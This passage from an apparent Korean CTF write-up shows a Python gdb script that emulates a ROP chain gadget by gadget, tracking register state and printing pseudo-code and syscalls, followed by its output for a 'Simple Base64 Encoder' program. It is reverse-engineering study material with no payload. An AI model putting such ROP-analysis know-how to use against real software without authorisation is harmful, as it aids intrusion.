</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rbx&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">19</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax += rbx ; rbx = {chains[i+1]} ; rbp = {chains[i+2]} ; r12 = {chains[i+3]} ; r13 = {chains[i+4]}&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">rbx</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rbp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r13</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rbx&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rbp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;r12&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;r13&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">20</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rcx = {chains[i+1]}&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rcx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rcx&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">21</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rdi</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">variables</span>.<span style="color:#a6e22e">keys</span>() <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">varname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rdi</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">variables</span>[<span style="color:#a6e22e">rdi</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;var_{varname}&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax &lt;&lt;= cl ; (QWORD)({variables[rdi]}) |= rax ; eax = 0&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax &lt;&lt;= cl ; *(QWORD *)(rdi) |= rax ; eax = 0&#39;</span>)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&lt;&lt;=</span> (<span style="color:#a6e22e">rcx</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">\#</span><span style="color:#a6e22e">mem</span> <span style="color:#a6e22e">accesss</span> <span style="color:#a6e22e">needed</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">22</span>]<span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rax</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">variables</span>.<span style="color:#a6e22e">keys</span>() <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">varname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rax</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">variables</span>[<span style="color:#a6e22e">rax</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;var_{varname}&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: (DWORD)({variables[rax]}) += 1&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(DWORD *)(rax) += 1&#39;</span>)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">23</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: invalid ops&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">24</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax += {rdi}&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax += rdi&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">rdi</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">25</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax &gt;&gt;= 6&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">26</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(BYTE *)({rdx}) = {rax&amp;0xff} ; rax = rdi&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(BYTE *)({rdx}) = rax ; rax = rdi&#39;</span>)  
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(BYTE *)(rdx) = rax ; rax = rdi&#39;</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">needed</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdi</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">27</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: eax *= 2&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">28</span>]<span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">more</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rsp = stack[idx] ; idx -= 1&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">29</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: xchg edi, eax&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdi</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rax</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmp</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">30</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: eax &lt;&lt;= 0x17 ; ecx |= eax&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span> <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rcx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">conf</span> <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rcx</span> <span style="color:#f92672">|=</span> (<span style="color:#a6e22e">rax</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rcx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;GG&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">chains</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ele</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;r-x&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">gdb</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;xinfo {ele}&#39;</span>,<span style="color:#a6e22e">to_string</span><span style="color:#f92672">=</span><span style="color:#a6e22e">True</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">process</span>(<span style="color:#a6e22e">ele</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: {hex(ele)}&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>나름대로 레지스터들의 상태를 기록하고 그 시점에 연산이 가능한지 아닌지에 대해서 판단을 해서, 연산이 가능하면 주석으로 그 결과를 표시한다. 시스템 콜의 번호들도 그 시점에 연산이 가능한 경우 직접 sys_read 같은 시스템 콜로 래핑해서 출력한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">chains</span> <span style="color:#a6e22e">ready</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">--------</span> <span style="color:#a6e22e">main</span>() <span style="color:#f92672">---------</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785000</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">23</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785018</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797815905</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785028</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785038</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785048</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x5576599ac061</span>, <span style="color:#ae81ff">23</span>) <span style="color:#75715e">// &#34;Simple Base64 Encoder!\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34785050</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">29</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785068</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797815950</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785078</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785088</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785098</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x5576599ac08e</span>, <span style="color:#ae81ff">29</span>) <span style="color:#75715e">// &#34;1. Encode\n2. Print\n3. Exit\n&gt; &#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x347850a0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347850b8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347850c8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347850d8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347850e8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">buf_5576599b6280</span>, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347850f0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2609</span>
